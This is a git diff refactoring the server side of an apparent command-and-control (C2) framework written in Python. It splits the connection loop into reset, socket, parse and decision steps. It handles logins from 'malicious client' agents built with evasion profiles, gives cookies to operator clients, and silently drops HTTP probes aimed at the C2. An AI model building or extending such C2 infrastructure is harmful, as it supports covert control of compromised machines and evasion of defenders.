@@ -121,17 +121,22 @@ class ServerSockHandler:
         ## Other Values
         self.http_redirect = "https://youtube.com"
         ##== Clients & lists
+        ## These dicts hold the classes
         self.clients = {}
-        self.current_clients = []
-        self.current_agents = []
+        self.agents = {}
         self.current_clients_cookies = {}
 
+        ## these lists hold the string repr of the current agetns/clients
+        self.current_clients = []
+        self.current_agents = []
+
         ## init per-client details. these exist so there are no unknown variable errors later
-        self.client_type = ""
-        self.id = None
-        self.message = ""
-        self.action = ""
-        self.response = ""
+        self.client_type    = str
+        self.client_id      = str
+        self.message        = str
+        self.action         = str
+        self.serversocket   = None
+        self.raw_response_from_client = str
 
         ## Modules
         ## This compiles the JSON schema and returns it
@@ -156,13 +161,7 @@ class ServerSockHandler:
         ip (str): The IP for the server to listen on
         port (int): The port for the server to listen on
         """
-    ##== Initial Connection (these are server connections, NOT client connetions)
-        
-    ##!! dev note, in future iterations maybe add a webserver component, using post & get commands instead of this
-    ## custom protocol stuff - who knows
-
-    ##### MOVE TO INDEPENDENT FILE ####
-        ## return respective items, or just use buffers
+    ##== Initial Connection
 
         try:
             self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -188,7 +187,6 @@ class ServerSockHandler:
             logging.warning(f"{self.Sx05}: \n {inspect.currentframe().f_back}: {e}\n")
         except Exception as e:
             logging.warning(f"{inspect.currentframe().f_back}: {e}\n {e}\n")
-    ##### /END MOVE TO INDEPENDENT FILE ####
                 
               
         
@@ -202,86 +200,127 @@ class ServerSockHandler:
                 must return false, as that tells the loop to continue to the next iteration/listening state. There are probably better ways to do this, but for now the return  is simple & works well
             
         """
-
         ## I kinda wanna name this loop, cascade sounds cool
         while True:
-        ##== Initial handling of client
-            
+        ##0 == Reset data 
+            self.server_reset_data()
+
+        ##1 == Initial handling of client
+            self.server_set_socket()
+
+        ##2 == Parsing the message sent to the server. 
+            self.server_parse_message()
+
+        ##3 == Decisions based on parsed messages
+            self.server_action_decision()
+
+    def server_reset_data(self):
+        '''
+        #0
+        resets self data to None on each loop.
+        '''
+        logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")
+
+        self.client_id   = None
+        self.action      = None
+        self.message     = None
+        self.client_type = None
+
+    def server_set_socket(self) -> None:
+        '''
+        #1
+        sets self.serversocket to a socket. This is the #1 step when getting a connection from a client/agent
+        '''
+        logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")
+
             # Cheap & dirty way to flip SSL on when ready
-            SSL = False
-            if SSL:
-                serversocket = self.server_ssl_handler()
+        SSL = False
+        if SSL:
+            self.serversocket = self.server_ssl_handler()
 
-
-            else:
-                serversocket = self.server_plaintext_handler()
+        else:
+            self.serversocket = self.server_plaintext_handler()
             
-            ## catching socket errors
-            if not serversocket:
-                    continue
+        ## catching socket errors
+        '''if not self.serversocket:
+                continue'''
 
-        ##### MOVE TO INDEPENDENT FILE ####
-        ##== Parsing the message sent to the server. 
-            try:
-                # Waiting on client to send followup message
-                raw_response_from_client = Comms.CommsHandler.receive_msg(conn=serversocket)
+    def server_parse_message(self):
+        '''
+        #2
+        This is #2 in the chain. It recieves the message via the socket in self.serversocket, and attempts to parse it.
+        
+        '''
+        logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")
+        try:
+            # Waiting on client to send followup message
+            self.raw_response_from_client = Comms.CommsHandler.receive_msg(conn=self.serversocket)
 
-                ## Converting to json. Validation is disabled during dev.
-                response_from_client = self.json_parser.convert_and_validate(raw_response_from_client)
+            ## Converting to json. Validation is disabled during dev.
+            response_from_client = self.json_parser.convert_and_validate(self.raw_response_from_client)
 
-                if response_from_client: 
-                    client_type    = response_from_client["general"]["client_type"]
-                    id             = response_from_client["general"]["client_id"]
-                    message        = response_from_client["msg"]["msg_command"]
-                    action         = response_from_client["general"]["action"]
+            if response_from_client: 
+                self.client_type    = response_from_client["general"]["client_type"]
+                self.client_id      = response_from_client["general"]["client_id"]
+                self.message        = response_from_client["msg"]["msg_command"]
+                self.action         = response_from_client["general"]["action"]
 
-                    print(f"DEBUG: MSG Breakdown\n\tclient_type:\t {client_type}\n\tid:\t\t {id}\n\tmessage:\t {message}\n\taction:\t\t {action}\n\n")
-                else:
-                    print("Nothing recieved from client")
+                print(f"DEBUG: MSG Breakdown\n\tclient_type:\t {self.client_type}\n\tid:\t\t {self.client_id}\n\tmessage:\t {self.message}\n\taction:\t\t {self.action}\n\n")
+            else:
+                print("Nothing recieved from client")
 
-            except Exception as e:
-                logging.warning(f"[Server.connection_handler()] No message, action, type, or id recieved. , error={e}")
-                print(traceback.format_exc())
+        except Exception as e:
+            logging.warning(f"[Server.connection_handler()] No message, action, type, or id recieved. , error={e}")
+            print(traceback.format_exc())
 
-            try:
-            ##== The decision handler based on the client_type, which can be:
-                ## !_clientlogin_!: A malicious client "logging" in
-                ## !_userlogin_!: A friendly client trying to log in    
+    def server_action_decision(self):
+        '''
+        #3
+
+        Enacts actions based on the recieved messages action feild
+        
+        '''
+        logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")
+
+        ##== The decision handler based on the client_type, which can be:
+            ## !_clientlogin_!: A malicious client "logging" in
+            ## !_userlogin_!: A friendly client trying to log in   
+            # 
+            # Notes: self.serversocket is passed as a LOCAL variable, instead of using the self.serversocket class variable. 
+            # Rationale: it's easer to track errors with the <NAME> function using the self. 
                 
-                ## == Decisions based on parsed messages
-                if action == "!_userlogin_!":
-                    print("userlogin")
+
+        ## == Decisions based on parsed messages
+        if self.action == "!_userlogin_!":
+            print("userlogin")
                     ## If function returns false, continue the loop. IMO that's the easiest way to handle a failure here
-                    if not self.clientloginhandler(
-                        request_from_client=raw_response_from_client,
-                        serversocket = serversocket):
+            if not self.clientloginhandler(
+                request_from_client=self.raw_response_from_client,
+                serversocket = self.serversocket):
                         
-                        continue
-                
+                print("Placeholder err msg")       
+
                 ## !_client_! handler -- change to AGENT
-                elif action == "!_clientlogin_!":
-                    if not self.agentloginhandler(
-                        serversocket = serversocket,
-                        raw_response_from_client=raw_response_from_client,
-                        id = id
-                        ):
-                        
-                        continue
-                
-                ## Getting rid of any http traffic that made its way to the c2 server instead of the webserver
-                elif any(method in self.client_type for method in ["GET", "HEAD", "POST", "INFO", "TRACE"]): ## sends a 403 denied via web browser/for scrapers
-                    ## I should capture these too and see whos hitting it
-                    ## immediatly drop connection, and mayyyybe add to a blocklist, but you could lose legit clients that way
-                    serversocket.close()
-                    logging.warning("[Server.connection_handler() ] Recieved HTTP Request to C2 server... closing connection")
+        elif self.action == "!_clientlogin_!":
+            if not self.agentloginhandler(
+                serversocket = self.serversocket,
+                raw_response_from_client=self.raw_response_from_client,
+                id = id
+                ):
+
+                print("Placeholder err msg")       
+                #continue
+
+        ## have dedicated functinos for these eventually
+        elif any(method in self.client_type for method in ["GET", "HEAD", "POST", "INFO", "TRACE"]): ## sends a 403 denied via web browser/for scrapers
+            ## I should capture these too and see whos hitting it
+            ## immediatly drop connection, and mayyyybe add to a blocklist, but you could lose legit clients that way
+            self.serversocket.close()
+            logging.warning("[Server.connection_handler() ] Recieved HTTP Request to C2 server... closing connection")
                     
-                else:
-                    logging.warning(f"[Server.connection_handler() ] Unexpected Connection from {self.client_remote_ip_port}. Action: {action} ")
-                    serversocket.close()
-            except Exception as e:
-                logging.debug(f"{inspect.currentframe().f_back}: {e}")
-
-
+        else:
+            logging.warning(f"[Server.connection_handler() ] Unexpected Connection from {self.client_remote_ip_port}. Action: {self.action} ")
+            self.serversocket.close()
 
     def server_ssl_handler(self) -> socket:
         '''
@@ -367,7 +406,6 @@ class ServerSockHandler:
             logging.warning(f"{self.SxXX}:{e}")  
 
     def clientloginhandler(self, request_from_client, serversocket):
-        logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")
         '''
         This function:
             - Sees if a client has logged in before
@@ -376,8 +414,8 @@ class ServerSockHandler:
             - Puts that instance in a new thread
         
         '''
-        print("I AM GETTING CALLED")
-        ## needs to be update to full Data.JsonHanlder, etc
+        logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")
+
         try:
             client_json_dict = DataEngine.JsonHandler.json_ops.from_json(request_from_client)
 
@@ -424,7 +462,7 @@ class ServerSockHandler:
                     ## create json to send back to client
                     cookie_json = DataEngine.JsonHandler.json_ops.to_json_for_client(msg_value=cookie, msg_content="auth_cookie")
                     Comms.CommsHandler.send_msg(conn = serversocket, msg = cookie_json)
-                    print("cookie sent back")
+                    print("[*] cookie sent back")
                     return True
                     ## from here, the client should take the cookie, hold onto it, and send a new request with the cookie in the auth_value feild of json.
                     ## it will then filter down to the 'elif auth_type == "cookie":'
@@ -455,23 +493,25 @@ class ServerSockHandler:
                     valid_cookie = self.current_clients_cookies[client_name].cookie
                 except Exception as e:
                     logging.warning(f'[!] Bad cookie for \'{client_json_dict["general"]["client_id"]}\': \'{client_json_dict["general"]["auth_value"]}\'')
+                    cookie_json = DataEngine.JsonHandler.json_ops.to_json_for_client(msg_value="Invalid Cookie")
+                    Comms.CommsHandler.send_msg(conn = serversocket, msg = cookie_json)
                     return False
-
 
                 print("precookie")
                 if SecurityEngine.AuthenticationHandler.Authentication.validate_cookie(request_cookie = client_request_cookie, valid_cookie = valid_cookie): 
-                    print("pass to ClientHandler...")
-                    #decision_tree()
-                    
+                    print("pass to ClientHandler...")                    
                     ##security checks too
-                    
 
                     ## if security checks out...
                     print("Theoretical Client Handler here")
-                    '''threading.Thread(
-                    target=self.clients[client_name].handle_client,
-                    args=(request_from_client, serversocket, id)
-                    ).start()'''
+                    ## class instance...
+                    self.clients[client_name] = ClientEngine.ClientHandler.ClientHandler(
+                        request_from_client=request_from_client,
+                        client_socket=serversocket
+                    )
+
+                    threading.Thread(target=self.clients[client_name].handle_client).start()
+
             except Exception as e:
                 logging.debug(f"{inspect.currentframe().f_back}: {e}")
 
@@ -479,7 +519,6 @@ class ServerSockHandler:
             print(f"[ERROR STUFF HERE ] Bad Auth Method attemtped {auth_type}")
             return False
             #logging.warning("[ERROR STUFF HERE ] Bad Auth Method attemtped")'''
-
 
     def agentloginhandler(self, serversocket=None, raw_response_from_client=None, id=None):
         logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")
@@ -528,12 +567,12 @@ class ServerSockHandler:
                 # sys_path & evasion_profile are both globals. evasion_profile is from argparse, and sys_path is defined at startup
                 #print(f"SERVER.PY {sys_path} + {evasion_profile}")
 
-                self.clients[agent_name] = ClientEngine.MaliciousClientHandler.ServerMaliciousClientHandler(sys_path=sys_path, evasion_profile_path=evasion_profile)
+                self.agents[agent_name] = ClientEngine.MaliciousClientHandler.ServerMaliciousClientHandler(sys_path=sys_path, evasion_profile_path=evasion_profile)
 
             # Create a new thread for this client's communication.
             # Passing the response from client, the socket, and the id. 
             threading.Thread(
-                target=self.clients[agent_name].handle_client,
+                target=self.agents[agent_name].handle_client,
                 args=(raw_response_from_client, serversocket, id)
                 ).start()
 
@@ -549,6 +588,16 @@ class ServerSockHandler:
 
         return True
 
+    def value_check(self):
+        '''
+        The purpose of this function is to make sure things are correct before doing an action
+        
+        '''
+        if self.serversocket == None:
+            logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")
+            logging.warning("Serversocket equals None!")
+
+        
 
 def continue_anyways():
     logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")
